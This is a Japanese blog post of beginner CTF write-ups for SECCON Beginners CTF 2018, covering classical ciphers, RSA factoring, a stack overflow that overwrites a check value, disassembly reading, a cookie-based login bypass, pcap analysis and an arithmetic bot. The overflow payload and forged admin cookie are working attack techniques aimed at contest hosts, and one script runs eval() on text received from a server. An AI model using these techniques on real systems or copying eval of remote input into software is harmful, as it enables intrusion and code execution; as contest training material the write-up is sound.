<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> SECCON Beginners CTF 2018 Writeups · alotofwe</title><meta name="description" content="SECCON Beginners CTF 2018 Writeups - alotofwe"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.jpeg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://suzupy.github.com/atom.xml" title="alotofwe"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.jpeg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="https://github.com/suzupy" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="https://twitter.com/alotofwe" target="_blank" class="nav-list-link">TWITTER</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">SECCON Beginners CTF 2018 Writeups</h1><div class="post-info">May 30, 2018</div><div class="post-content"><p>Crypto 2, Pwn 1, Reversing 1, Web 1, Misc 3問で195位<br>以下、flagは直接表示せず解法のみ記載する</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Veni-vidi-vici"><a href="#Veni-vidi-vici" class="headerlink" title="Veni, vidi, vici"></a>Veni, vidi, vici</h2><p>text fileが3つ与えられる<br>part1はROT13, part2はROT8, part3は上下逆さに読む<br>1~3の結果を繋げるとflagとなる</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">% file part1</span><br><span class="line">part1: ASCII text</span><br><span class="line">% file part2</span><br><span class="line">part2: ASCII text</span><br><span class="line">% file part3</span><br><span class="line">part3: UTF-8 Unicode text</span><br><span class="line">% cat part1</span><br><span class="line">Gur svefg cneg bs gur synt vf: pgs4o&#123;a0zber</span><br><span class="line">% cat part2</span><br><span class="line">Lzw kwugfv hsjl gx lzw xdsy ak: _uDskk!usd_u</span><br><span class="line">% cat part3</span><br><span class="line">&#123;ʎɥdɐɹɓ0ʇdʎᴚ :sı ɓɐlɟ ǝɥʇ ɟo ʇɹɐd pɹıɥʇ ǝɥ⊥</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><figcaption><span>crypto1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot</span><span class="params">(n,s)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> (<span class="number">65</span>, <span class="number">97</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">            d[chr(i+c)] = chr((i+n) % <span class="number">26</span> + c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([d.get(c, c) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line">part1 = <span class="string">'Gur svefg cneg bs gur synt vf: pgs4o&#123;a0zber'</span></span><br><span class="line">part2 = <span class="string">'Lzw kwugfv hsjl gx lzw xdsy ak: _uDskk!usd_u'</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'----- part1 -----'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">25</span>):</span><br><span class="line">    print(str(i) + <span class="string">' : '</span> + rot(i,part1))</span><br><span class="line">print(<span class="string">'----- part2 -----'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">25</span>):</span><br><span class="line">    print(str(i) + <span class="string">' : '</span> + rot(i,part2))</span><br></pre></td></tr></table></figure>
<h2 id="RSA-is-Power"><a href="#RSA-is-Power" class="headerlink" title="RSA is Power"></a>RSA is Power</h2><p>RSAのN, E, Cが与えられる<br>Nを<a href="http://stdkmd.com/nrr/msieve_ja.htm" target="_blank" rel="noopener">Msieve</a>を用いて素因数分解し復号する</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">% ./msieve -q -v -e 97139961312384239075080721131188244842051515305572003521287545456189235939577</span><br><span class="line">Msieve v. 1.52 (SVN unknown)</span><br><span class="line">Sun May 27 12:28:20 2018</span><br><span class="line">random seeds: 6e686328 e437b032</span><br><span class="line">factoring 97139961312384239075080721131188244842051515305572003521287545456189235939577 (77 digits)</span><br><span class="line">searching <span class="keyword">for</span> 15-digit factors</span><br><span class="line">searching <span class="keyword">for</span> 20-digit factors</span><br><span class="line">commencing quadratic sieve (77-digit input)</span><br><span class="line">using multiplier of 17</span><br><span class="line">using generic 32kb sieve core</span><br><span class="line">sieve interval: 12 blocks of size 32768</span><br><span class="line">processing polynomials <span class="keyword">in</span> batches of 17</span><br><span class="line">using a sieve bound of 922619 (36471 primes)</span><br><span class="line">using large prime bound of 92261900 (26 bits)</span><br><span class="line">using trial factoring cutoff of 26 bits</span><br><span class="line">polynomial <span class="string">'A'</span> values have 10 factors</span><br><span class="line">restarting with 19257 full and 192162 partial relations</span><br><span class="line">36824 relations (19257 full + 17567 combined from 192162 partial), need 36567</span><br><span class="line">begin with 211419 relations</span><br><span class="line">reduce to 52152 relations <span class="keyword">in</span> 2 passes</span><br><span class="line">attempting to <span class="built_in">read</span> 52152 relations</span><br><span class="line">recovered 52152 relations</span><br><span class="line">recovered 40908 polynomials</span><br><span class="line">attempting to build 36824 cycles</span><br><span class="line">found 36824 cycles <span class="keyword">in</span> 1 passes</span><br><span class="line">distribution of cycle lengths:</span><br><span class="line">   length 1 : 19257</span><br><span class="line">   length 2 : 17567</span><br><span class="line">largest cycle: 2 relations</span><br><span class="line">matrix is 36471 x 36824 (5.3 MB) with weight 1107805 (30.08/col)</span><br><span class="line">sparse part has weight 1107805 (30.08/col)</span><br><span class="line">filtering completed <span class="keyword">in</span> 3 passes</span><br><span class="line">matrix is 25811 x 25874 (4.1 MB) with weight 862421 (33.33/col)</span><br><span class="line">sparse part has weight 862421 (33.33/col)</span><br><span class="line">saving the first 48 matrix rows <span class="keyword">for</span> later</span><br><span class="line">matrix includes 64 packed rows</span><br><span class="line">matrix is 25763 x 25874 (2.6 MB) with weight 618823 (23.92/col)</span><br><span class="line">sparse part has weight 423573 (16.37/col)</span><br><span class="line">commencing Lanczos iteration</span><br><span class="line">memory use: 2.6 MB</span><br><span class="line">lanczos halted after 409 iterations (dim = 25759)</span><br><span class="line">recovered 15 nontrivial dependencies</span><br><span class="line">prp39 factor: 299681192390656691733849646142066664329</span><br><span class="line">prp39 factor: 324144336644773773047359441106332937713</span><br><span class="line">elapsed time 00:00:12</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><figcaption><span>crypto2.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">97139961312384239075080721131188244842051515305572003521287545456189235939577</span></span><br><span class="line">p = <span class="number">299681192390656691733849646142066664329</span></span><br><span class="line">q = <span class="number">324144336644773773047359441106332937713</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">77361455127455996572404451221401510145575776233122006907198858022042920987316</span></span><br><span class="line"></span><br><span class="line">a = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">if</span> (a * x + <span class="number">1</span>) % e == <span class="number">0</span>:</span><br><span class="line">        d = (a * x + <span class="number">1</span>) / e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    x = x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">flag = (<span class="string">'%x'</span> % m).decode(<span class="string">'hex'</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="condition"><a href="#condition" class="headerlink" title="condition"></a>condition</h2><p>指定されたhost, portに接続すると名前を尋ねられる  </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% nc pwn1.chall.beginners.seccon.jp 16268</span><br><span class="line">Please tell me your name...myname</span><br><span class="line">Permission denied</span><br></pre></td></tr></table></figure>
<p>実行ファイルが配布されており、objdumpで見るとmain文は以下の通り (-M intel)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000000000400771 &lt;main&gt;:</span><br><span class="line">  400771:	55                   	push   rbp</span><br><span class="line">  400772:	48 89 e5             	mov    rbp,rsp</span><br><span class="line">  400775:	48 83 ec 30          	sub    rsp,0x30</span><br><span class="line">  400779:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0</span><br><span class="line">  400780:	bf d8 08 40 00       	mov    edi,0x4008d8</span><br><span class="line">  400785:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  40078a:	e8 71 fe ff ff       	call   400600 &lt;printf@plt&gt;</span><br><span class="line">  40078f:	48 8d 45 d0          	lea    rax,[rbp-0x30]</span><br><span class="line">  400793:	48 89 c7             	mov    rdi,rax</span><br><span class="line">  400796:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  40079b:	e8 80 fe ff ff       	call   400620 &lt;gets@plt&gt;</span><br><span class="line">  4007a0:	81 7d fc ef be ad de 	cmp    DWORD PTR [rbp-0x4],0xdeadbeef</span><br><span class="line">  4007a7:	75 16                	jne    4007bf &lt;main+0x4e&gt;</span><br><span class="line">  4007a9:	bf f8 08 40 00       	mov    edi,0x4008f8</span><br><span class="line">  4007ae:	e8 0d fe ff ff       	call   4005c0 &lt;puts@plt&gt;</span><br><span class="line">  4007b3:	bf 1e 09 40 00       	mov    edi,0x40091e</span><br><span class="line">  4007b8:	e8 16 00 00 00       	call   4007d3 &lt;read_file&gt;</span><br><span class="line">  4007bd:	eb 0a                	jmp    4007c9 &lt;main+0x58&gt;</span><br><span class="line">  4007bf:	bf 27 09 40 00       	mov    edi,0x400927</span><br><span class="line">  4007c4:	e8 f7 fd ff ff       	call   4005c0 &lt;puts@plt&gt;</span><br><span class="line">  4007c9:	bf 00 00 00 00       	mov    edi,0x0</span><br><span class="line">  4007ce:	e8 6d fe ff ff       	call   400640 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
<p>4007a0以降が重要で、0xdeadbeefとDWORD PTR [rbp-0x4]を比較し一致しなければ4007bfへjumpしている<br>認証成功すれば4007a7~4007bdを実行、そうでなければ4007bfへ飛ばされる</p>
<p>gdb-pedaでstep実行するとgetsで読み込んだ値はrspに保存されることが分かる<br>rbpとrspのアドレスは固定なので、DWORD PTR [rbp-0x4]が0xdeadbeefになるよう入力を生成して認証を突破する<br>リトルエンディアンに注意</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*44+'\xef\xbe\xad\xde'"</span> | nc pwn1.chall.beginners.seccon.jp 16268</span><br></pre></td></tr></table></figure>
<h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="Simple-Auth"><a href="#Simple-Auth" class="headerlink" title="Simple Auth"></a>Simple Auth</h2><p>実行可能なファイルが渡される</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% simple_auth</span><br><span class="line">Input Password: mypassword</span><br><span class="line">Umm...Auth failed...</span><br></pre></td></tr></table></figure>
<p>objdumpするとauth functionにフラグが埋め込まれている</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">----- snip -----</span><br><span class="line"></span><br><span class="line">0000000000400686 &lt;auth&gt;:</span><br><span class="line">  400686:	55                   	push   rbp</span><br><span class="line">  400687:	48 89 e5             	mov    rbp,rsp</span><br><span class="line">  40068a:	48 83 ec 50          	sub    rsp,0x50</span><br><span class="line">  40068e:	48 89 7d b8          	mov    QWORD PTR [rbp-0x48],rdi</span><br><span class="line">  400692:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28</span><br><span class="line">  400699:	00 00 </span><br><span class="line">  40069b:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">  40069f:	31 c0                	xor    eax,eax</span><br><span class="line">  4006a1:	c7 45 c0 01 00 00 00 	mov    DWORD PTR [rbp-0x40],0x1</span><br><span class="line">  4006a8:	c6 45 d0 63          	mov    BYTE PTR [rbp-0x30],0x63</span><br><span class="line">  4006ac:	c6 45 d1 74          	mov    BYTE PTR [rbp-0x2f],0x74</span><br><span class="line">  4006b0:	c6 45 d2 66          	mov    BYTE PTR [rbp-0x2e],0x66</span><br><span class="line">  4006b4:	c6 45 d3 34          	mov    BYTE PTR [rbp-0x2d],0x34</span><br><span class="line">  4006b8:	c6 45 d4 62          	mov    BYTE PTR [rbp-0x2c],0x62</span><br><span class="line">  4006bc:	c6 45 d5 7b          	mov    BYTE PTR [rbp-0x2b],0x7b</span><br><span class="line">  4006c0:	c6 45 d6 72          	mov    BYTE PTR [rbp-0x2a],0x72</span><br><span class="line">  4006c4:	c6 45 d7 65          	mov    BYTE PTR [rbp-0x29],0x65</span><br><span class="line">  4006c8:	c6 45 d8 76          	mov    BYTE PTR [rbp-0x28],0x76</span><br><span class="line">  4006cc:	c6 45 d9 33          	mov    BYTE PTR [rbp-0x27],0x33</span><br><span class="line">  4006d0:	c6 45 da 72          	mov    BYTE PTR [rbp-0x26],0x72</span><br><span class="line">  4006d4:	c6 45 db 73          	mov    BYTE PTR [rbp-0x25],0x73</span><br><span class="line">  4006d8:	c6 45 dc 69          	mov    BYTE PTR [rbp-0x24],0x69</span><br><span class="line">  4006dc:	c6 45 dd 6e          	mov    BYTE PTR [rbp-0x23],0x6e</span><br><span class="line">  4006e0:	c6 45 de 67          	mov    BYTE PTR [rbp-0x22],0x67</span><br><span class="line">  4006e4:	c6 45 df 5f          	mov    BYTE PTR [rbp-0x21],0x5f</span><br><span class="line">  4006e8:	c6 45 e0 70          	mov    BYTE PTR [rbp-0x20],0x70</span><br><span class="line">  4006ec:	c6 45 e1 34          	mov    BYTE PTR [rbp-0x1f],0x34</span><br><span class="line">  4006f0:	c6 45 e2 73          	mov    BYTE PTR [rbp-0x1e],0x73</span><br><span class="line">  4006f4:	c6 45 e3 73          	mov    BYTE PTR [rbp-0x1d],0x73</span><br><span class="line">  4006f8:	c6 45 e4 77          	mov    BYTE PTR [rbp-0x1c],0x77</span><br><span class="line">  4006fc:	c6 45 e5 30          	mov    BYTE PTR [rbp-0x1b],0x30</span><br><span class="line">  400700:	c6 45 e6 72          	mov    BYTE PTR [rbp-0x1a],0x72</span><br><span class="line">  400704:	c6 45 e7 64          	mov    BYTE PTR [rbp-0x19],0x64</span><br><span class="line">  400708:	c6 45 e8 7d          	mov    BYTE PTR [rbp-0x18],0x7d</span><br><span class="line">  40070c:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]</span><br><span class="line"></span><br><span class="line">----- snip -----</span><br></pre></td></tr></table></figure>
<h2 id="Greeting"><a href="#Greeting" class="headerlink" title="Greeting"></a>Greeting</h2><p>nameを入力するページと、そのページで動いているPHPのソースが与えられる<br><code>isset($_POST[&#39;name&#39;])</code>がfalseで<code>isset($_COOKIE[&#39;name&#39;])</code>がtrueになり、かつ$usernameのvalueがadminになればよい<br>curlでcookie name=adminを指定する</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% curl -sS --cookie <span class="string">'name=admin'</span>  http://greeting.chall.beginners.seccon.jp | grep ctf4b</span><br></pre></td></tr></table></figure>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="plain-mail"><a href="#plain-mail" class="headerlink" title="plain mail"></a>plain mail</h2><p>pcap fileが与えられる<br>読むと1通目のメールにbase64エンコードされたzip file, 2通目にパスワードが書かれている<br>zip fileをデコードして解凍</p>
<figure class="highlight python"><figcaption><span>misc1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">print(base64.b64decode(<span class="string">''</span>.join(sys.argv[<span class="number">1</span>:])))</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% python misc1.py $(strings packet.pcap | grep -A4 base | tail -4) &gt; encrypted.zip</span><br><span class="line">% unzip -p _you_are_pro_ encrypted.zip</span><br></pre></td></tr></table></figure>
<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>フラグは公式IRCチャンネルのトピックにあります。</p>
<h2 id="てけいさんえくすとりーむず"><a href="#てけいさんえくすとりーむず" class="headerlink" title="てけいさんえくすとりーむず"></a>てけいさんえくすとりーむず</h2><p>てけいさんでは間に合わないため、式を受け取り計算して返すプログラムを書く</p>
<figure class="highlight python"><figcaption><span>misc2.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'tekeisan-ekusutoriim.chall.beginners.seccon.jp'</span>, <span class="number">8690</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    response = s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(response)</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">'='</span> <span class="keyword">in</span> response) <span class="keyword">is</span> <span class="keyword">False</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    expr = response.split(<span class="string">'\n'</span>)[<span class="number">-1</span>].replace(<span class="string">' = '</span>, <span class="string">''</span>)</span><br><span class="line">    s.send(str(eval(expr)) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
</div></article></div></main><footer><div class="paginator"><a href="/seccon-2015-online-ctf-steganography2/" class="prev">PREV</a><a href="/disable-github-two-factor-auth/" class="next">NEXT</a></div><div class="copyright"><p>If you find some wrong in my articles, please notify me at Twitter.</p><p>© 2015 - 2018 <a href="http://suzupy.github.com">alotofwe</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>